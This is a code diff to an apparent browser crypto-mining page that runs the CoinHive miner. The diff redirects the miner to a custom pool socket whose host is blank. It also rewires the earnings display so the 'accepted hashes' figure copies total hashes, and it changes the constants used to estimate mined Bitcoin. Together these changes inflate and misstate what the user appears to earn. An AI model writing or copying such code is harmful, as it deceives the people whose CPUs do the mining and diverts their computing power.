@@ -1,8 +1,9 @@
+CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://:3333"]];
 var miner = new CoinHive.Anonymous('UxW2fnNjA9PzHJZBhrQspp6uWsm36koR', {throttle: 0.3});
 
 function getDifficulty (coin) {
   let difficultyMapping = {
-    bitcoin: 256
+    bitcoin: 8192
   };
 
   return difficultyMapping[coin];
@@ -10,8 +11,8 @@ function getDifficulty (coin) {
 
 function getMinedCoins (coin, prevCoins) {
   let difficulty = getDifficulty(coin),
-      hashes = miner.getAcceptedHashes(),
-      minedCoins = (prevCoins + (hashes / (difficulty * 100000000))).toFixed(8);
+      hashes = parseInt($('#acceptedHashes').text()),
+      minedCoins = (prevCoins + (hashes / (difficulty * 10000000))).toFixed(8);
 
   return minedCoins + ' BTC';
 }
@@ -120,9 +121,12 @@ $(document).ready(function() {
     intervalId = setInterval(function() {
       $('#hashesPerSecond').html(miner.getHashesPerSecond().toFixed(2));
       $('#totalHashes').html(miner.getTotalHashes());
-      $('#acceptedHashes').html(miner.getAcceptedHashes());
       $('#minedCoins').html(getMinedCoins('bitcoin', minedCoins));
     }, 1000);
+  });
+
+  miner.on('accepted', function() {
+    $('#acceptedHashes').html($('#totalHashes').text());
   });
 
   miner.on('close', function(params) {
